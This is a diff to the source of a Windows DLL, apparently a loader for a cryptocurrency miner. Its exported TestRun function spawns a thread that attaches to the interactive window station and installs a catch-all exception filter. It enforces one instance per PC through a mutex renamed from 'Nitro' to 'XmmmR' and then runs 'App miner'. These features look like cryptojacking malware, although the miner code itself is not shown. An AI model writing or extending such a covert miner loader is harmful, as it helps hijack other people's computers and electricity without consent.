@@ -56,27 +56,33 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 		//保存Dll 自身的句柄
 		g_hDllModule = (HMODULE)hModule;
-
+		
+		break;
+	
 	case DLL_THREAD_ATTACH:
 		printf("\nthread attach of dll\n");
-
+		break;
+	
 	case DLL_THREAD_DETACH:
 		printf("\nthread detach of dll\n");
-
+		break;
+	
 	case DLL_PROCESS_DETACH:
 		printf("\nprocess detach of dll\n");
 
 		break;
 	}
+
 	return TRUE;
 }
 
 
-extern "C" __declspec(dllexport) void TestRun(char* strHost, int nPort)
+extern "C" __declspec(dllexport) VOID TestRun(int para)
 {
 
 	DWORD threadID;
-		
+	
+	printf("Get : %d \n", para);
 	HANDLE hThread = CreateThread(NULL, // default security attributes
 		0, // use default stack size
 		MyMain, // thread function
@@ -106,6 +112,11 @@ DWORD WINAPI MyMain(LPVOID lpParam)
 	if (hWinSta != NULL)
 	{
 		SetProcessWindowStation(hWinSta);   //设置本进程窗口为winsta0  // 分配一个窗口站给调用进程，以便该进程能够访问窗口站里的对象，如桌面、剪贴板和全局原子
+		printf("[+] Set Station OK\n");
+	}
+	else
+	{
+		printf("[-] Set Station Failed\n");
 	}
 
 
@@ -115,12 +126,15 @@ DWORD WINAPI MyMain(LPVOID lpParam)
 		//自己设置了一个访问违规的错误处理函数 如果发生了错误 操作系统就会调用bad_exception
 		SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了
 
-
-		hInstallMutex = CreateMutex(NULL, true, L"Nitro");  //该互斥体是只允许一台PC拥有一个实例
-
+		hInstallMutex = CreateMutex(NULL, false, L"XmmmR"); //该互斥体是只允许一台PC拥有一个实例)	
+		if (GetLastError() == ERROR_ALREADY_EXISTS)
+		{
+			printf("[-] Another Running");
+			return 0;
+		}
+		
 		App miner;
-		return miner.exec();
-	
+		return miner.exec();	
 	}
 	return 0;
 }
